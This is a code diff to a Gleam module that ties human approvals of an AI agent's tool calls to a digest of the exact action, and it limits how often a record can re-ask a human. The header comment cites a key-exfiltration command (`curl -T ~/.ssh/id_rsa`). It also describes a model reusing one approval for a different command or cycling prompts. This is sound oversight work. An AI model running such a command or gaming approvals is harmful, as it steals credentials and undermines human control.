@@ -46,9 +46,34 @@
 //// attempt would name a call nothing can re-clear. What the exactness
 //// buys is unchanged by that — one claimant at a time, one CAS from
 //// `Approved` to `Consumed`, so one approval is one widened execution of
-//// one call — and only a call whose denial digests to the same record id
-//// can ever hold the claim, which is to say the same want, on the same
-//// strand, through the same tool.
+//// one call.
+////
+//// ## What the consent is about (#65)
+////
+//// The want is not the action. Two calls on one strand through one tool
+//// asking for one policy diff digest to the same record id however
+//// different the commands they would run, so inheriting an approval on
+//// the strength of the id alone hands a human's "yes" about `bash true`
+//// to `bash curl -T ~/.ssh/id_rsa …`. Design §5.3 grants one
+//// re-execution *of the denied action*, so the record carries the
+//// claimant's **action digest** alongside its scope, and an approval is
+//// inherited only by a claimant whose action digests the same. A
+//// mismatch is not a refusal but a fresh question: the record re-opens
+//// as `Pending` bound to the new action, and the human is asked again.
+////
+//// The digest is computed by the client (`client/escalate.action_digest`
+//// over the call's effective arguments) and stored here as an opaque
+//// string. This module never renders, parses or compares anything about
+//// a tool's arguments — that would import tool semantics into the
+//// consent layer, and every field the consent layer decided to overlook
+//// would be a field the model may vary after consent.
+////
+//// Re-opening is what #66 is about, and the new mismatch edge would make
+//// it worse: a model that varies its arguments after each approval could
+//// otherwise drive prompt cycles without bound. So a record counts the
+//// questions it has asked (`asked`) and `claimed` refuses to re-open
+//// past the caller's `max_asks`, leaving the record terminal and the
+//// call to settle in band.
 
 import core/corruption.{type CorruptionReport}
 import core/ids.{type OpId}
@@ -103,6 +128,23 @@ pub type CallScope {
   )
 }
 
+/// The action a claimant is asking to be allowed to run: what the
+/// human's "yes" would actually authorize, as opposed to the policy
+/// diff it would authorize it under.
+///
+/// All three fields are computed by the client that raises
+/// (`client/escalate`), because rendering a tool's arguments is tool
+/// knowledge and this module has none. Constructor invariants: `tool` is
+/// the tool name — recoverable from nothing else, since the record id is
+/// a one-way digest; `digest` is a stable digest of the call's effective
+/// arguments, compared for equality and never interpreted; `preview` is
+/// a **bounded** human rendering of those arguments, displayed and never
+/// compared, bounded because the record is decoded on the clearance and
+/// gateway-pull hot paths.
+pub type Action {
+  Action(tool: String, digest: String, preview: String)
+}
+
 /// One durable escalation record — the `fact.custom` payload stored
 /// under `escalation/{id}`.
 ///
@@ -117,6 +159,19 @@ pub type CallScope {
 /// Approved → Consumed or Pending → Rejected within one decision cycle,
 /// and a fresh raise for the same want (`claimed`) starts a new cycle
 /// from a decided record.
+///
+/// `tool`, `action` and `preview` are the current claimant's `Action`,
+/// refreshed on every claim that moves the record, and `None` together
+/// only on a record raised through a door that names no action (the
+/// legacy shape, and `raise_escalation_for`). A record whose `action` is
+/// `None` inherits no approval and satisfies no spend, for the same
+/// reason an unscoped one widens nothing: consent that cannot be
+/// attributed to an action must not authorize one.
+///
+/// `asked` counts the questions this row has put to a human — one for
+/// the raise that opened it, one more for each re-opening — and is what
+/// `claimed` bounds a re-asking loop against. It decodes as `0` on a
+/// record written before it existed.
 pub type Escalation {
   Escalation(
     id: String,
@@ -124,6 +179,10 @@ pub type Escalation {
     scope: Option(CallScope),
     grants: List(JsonValue),
     status: Status,
+    tool: Option(String),
+    action: Option(String),
+    preview: Option(String),
+    asked: Int,
   )
 }
 
@@ -158,7 +217,18 @@ pub fn encode(escalation: Escalation) -> JsonValue {
     #("scope", encode_scope(escalation.scope)),
     #("grants", json.Array(escalation.grants)),
     #("status", json.String(status_to_string(escalation.status))),
+    #("tool", encode_optional_string(escalation.tool)),
+    #("action", encode_optional_string(escalation.action)),
+    #("preview", encode_optional_string(escalation.preview)),
+    #("asked", json.Int(escalation.asked)),
   ])
+}
+
+fn encode_optional_string(value: Option(String)) -> JsonValue {
+  case value {
+    None -> json.Null
+    Some(text) -> json.String(text)
+  }
 }
 
 fn encode_scope(scope: Option(CallScope)) -> JsonValue {
@@ -204,7 +274,21 @@ pub fn decode(payload: JsonValue) -> Result(Escalation, CorruptionReport) {
       })
       use status_text <- result.try(require_string(fields, "status", where))
       use status <- result.try(status_from_string(status_text, where))
-      Ok(Escalation(id:, denial:, scope:, grants:, status:))
+      use tool <- result.try(optional_string(fields, "tool", where))
+      use action <- result.try(optional_string(fields, "action", where))
+      use preview <- result.try(optional_string(fields, "preview", where))
+      use asked <- result.try(optional_int(fields, "asked", where))
+      Ok(Escalation(
+        id:,
+        denial:,
+        scope:,
+        grants:,
+        status:,
+        tool:,
+        action:,
+        preview:,
+        asked:,
+      ))
     }
     other ->
       Error(corruption.report(
@@ -251,6 +335,48 @@ fn decode_scope(
         at: where,
         on: "scope",
         expected: "null or a call-scope object",
+        context: json.to_string(other),
+      ))
+  }
+}
+
+// The four fields the action binding added decode totally on a record
+// written before it existed: absent or null is "this record names no
+// action", which inherits no approval and satisfies no spend. Present
+// but of the wrong type stays corruption — a half-readable record is
+// not one to fall back on, because falling back would change which
+// claimant the record answers to.
+fn optional_string(
+  fields: List(#(String, JsonValue)),
+  key: String,
+  where: String,
+) -> Result(Option(String), CorruptionReport) {
+  case list.key_find(fields, key) {
+    Error(Nil) | Ok(json.Null) -> Ok(None)
+    Ok(json.String(text)) -> Ok(Some(text))
+    Ok(other) ->
+      Error(corruption.report(
+        at: where,
+        on: key,
+        expected: "null or a string",
+        context: json.to_string(other),
+      ))
+  }
+}
+
+fn optional_int(
+  fields: List(#(String, JsonValue)),
+  key: String,
+  where: String,
+) -> Result(Int, CorruptionReport) {
+  case list.key_find(fields, key) {
+    Error(Nil) | Ok(json.Null) -> Ok(0)
+    Ok(json.Int(number)) -> Ok(number)
+    Ok(other) ->
+      Error(corruption.report(
+        at: where,
+        on: key,
+        expected: "null or an integer",
         context: json.to_string(other),
       ))
   }
@@ -380,22 +506,55 @@ pub fn consume(record: Escalation) -> Escalation {
   Escalation(..record, status: Consumed)
 }
 
-/// A fresh pending record for a raised denial. `scope` is the exact call
-/// the denial names; `None` records a legacy unscoped escalation that
-/// only an explicit `consume_escalation` can ever spend.
+/// A fresh pending record for a raised denial, asked once. `scope` is
+/// the exact call the denial names; `None` records a legacy unscoped
+/// escalation that only an explicit `consume_escalation` can ever spend.
+/// `action` is what the claimant is asking to run; `None` records an
+/// escalation raised through a door that names no action, which no claim
+/// inherits and no spend satisfies.
 ///
 /// ## Examples
 ///
 /// ```gleam
-/// // escalation.raised("esc-1", denial_json, Some(scope))
+/// // escalation.raised("esc-1", denial_json, action: None, scope: Some(s))
 /// ```
 ///
 pub fn raised(
   id: String,
   denial: JsonValue,
-  scope: Option(CallScope),
+  action action: Option(Action),
+  scope scope: Option(CallScope),
 ) -> Escalation {
-  Escalation(id:, denial:, scope:, grants: [], status: Pending)
+  let #(tool, digest, preview) = case action {
+    None -> #(None, None, None)
+    Some(Action(tool:, digest:, preview:)) -> #(
+      Some(tool),
+      Some(digest),
+      Some(preview),
+    )
+  }
+  Escalation(
+    id:,
+    denial:,
+    scope:,
+    grants: [],
+    status: Pending,
+    tool:,
+    action: digest,
+    preview:,
+    asked: 1,
+  )
+}
+
+/// What a claim did to a record.
+pub type Claim {
+  /// The claim moved: this is the record to commit.
+  Claimed(record: Escalation)
+  /// The claim would have re-opened a question this row has already
+  /// asked `max_asks` times. Nothing is written, the record stays
+  /// terminal, and the claimant settles in band without prompting
+  /// anyone.
+  Exhausted(record: Escalation)
 }
 
 /// The record after `scope`'s call raises the same denial against it —
@@ -407,34 +566,82 @@ pub fn raised(
 /// because a scoped approval is spent by the claimant and nobody else:
 ///
 /// - **Pending** — nobody has decided yet, so the claim simply moves and
-///   the stored denial is refreshed to the live call's. One row, one
-///   prompt, and the human reads what the call in hand actually wants.
-/// - **Approved** — a human said yes to this want, on this strand, for
-///   this tool, and the grants they chose are unchanged; the claim moves
-///   so the approval can be spent by a call that exists. It cannot
-///   widen anything beyond what was approved: the grants are the
-///   record's, not the claimant's.
-/// - **Rejected** or **Consumed** — the previous cycle is over. A new
-///   raise re-opens the question as `Pending` with no grants, so one
-///   approval stays worth exactly one execution and one denial stays a
-///   decision about one call rather than a session-lifetime verdict on
-///   the want.
+///   the stored denial, action and preview are refreshed to the live
+///   call's. One row, one prompt, and the human reads what the call in
+///   hand actually wants and what it would run.
+/// - **Approved on the same action** — a human said yes to this want, on
+///   this strand, for this tool, running *this*; the grants they chose
+///   are unchanged and the claim moves so the approval can be spent by a
+///   call that exists. This is the retry the whole claim mechanism is
+///   for. It cannot widen anything beyond what was approved: the grants
+///   are the record's, not the claimant's.
+/// - **Approved on a different action** — the consent in hand is about
+///   an action nobody is proposing any more (#65). It is not inherited
+///   and it is not silently kept either: the record re-opens as a fresh
+///   `Pending` question bound to the new action, with no grants, and the
+///   claimant settles in band exactly as a first refusal would.
+/// - **Rejected** or **Consumed** — the previous cycle is over, and a
+///   new raise re-opens the question, so one approval stays worth
+///   exactly one execution and one denial stays a decision about one
+///   call rather than a session-lifetime verdict on the want.
+///
+/// Every re-opening is a question a human has to answer, and the party
+/// provoking them is the party this mechanism exists to constrain, so a
+/// row that has already asked `max_asks` times refuses to ask again
+/// (`Exhausted`) rather than re-opening for a fourth.
 ///
 /// ## Examples
 ///
 /// ```gleam
-/// // escalation.claimed(record, denial, scope).scope == option.Some(scope)
+/// // escalation.claimed(record, denial, action, scope, max_asks: 3)
 /// ```
 ///
 pub fn claimed(
   record: Escalation,
   denial: JsonValue,
+  action: Action,
   scope: CallScope,
-) -> Escalation {
+  max_asks max_asks: Int,
+) -> Claim {
   case record.status {
-    Pending -> Escalation(..record, denial:, scope: Some(scope))
-    Approved -> Escalation(..record, scope: Some(scope))
-    Rejected | Consumed -> raised(record.id, denial, Some(scope))
+    Pending ->
+      Claimed(
+        Escalation(
+          ..record,
+          denial:,
+          scope: Some(scope),
+          tool: Some(action.tool),
+          action: Some(action.digest),
+          preview: Some(action.preview),
+        ),
+      )
+    Approved ->
+      case bound_to(record, action.digest) {
+        True -> Claimed(Escalation(..record, scope: Some(scope)))
+        False -> reopened(record, denial, action, scope, max_asks)
+      }
+    Rejected | Consumed -> reopened(record, denial, action, scope, max_asks)
+  }
+}
+
+// A new cycle on an old row: the same id, the claimant's denial and
+// action, no grants, and one more question on the counter.
+fn reopened(
+  record: Escalation,
+  denial: JsonValue,
+  action: Action,
+  scope: CallScope,
+  max_asks: Int,
+) -> Claim {
+  case record.asked >= max_asks {
+    True -> Exhausted(record)
+    False ->
+      Claimed(
+        Escalation(
+          ..raised(record.id, denial, action: Some(action), scope: Some(scope)),
+          asked: record.asked + 1,
+        ),
+      )
   }
 }
 
@@ -451,6 +658,26 @@ pub fn claimed(
 ///
 pub fn scoped_to(record: Escalation, scope: CallScope) -> Bool {
   record.scope == Some(scope)
+}
+
+/// Whether an escalation is bound to exactly this action digest —
+/// design §5.3's "of the denied action", asked as a string comparison
+/// over a digest this module never computes.
+///
+/// A record with no action bound matches nothing, which is the same
+/// direction `scoped_to` takes with an unscoped record and for the same
+/// reason: consent that cannot be attributed to an action must not
+/// authorize one. Such a record re-opens on the next claim, carrying
+/// the live claimant's action, rather than being spendable by anything.
+///
+/// ## Examples
+///
+/// ```gleam
+/// // escalation.bound_to(record, "9f2c…") == True
+/// ```
+///
+pub fn bound_to(record: Escalation, action: String) -> Bool {
+  record.action == Some(action)
 }
 
 /// The record after an approval with `grants`.
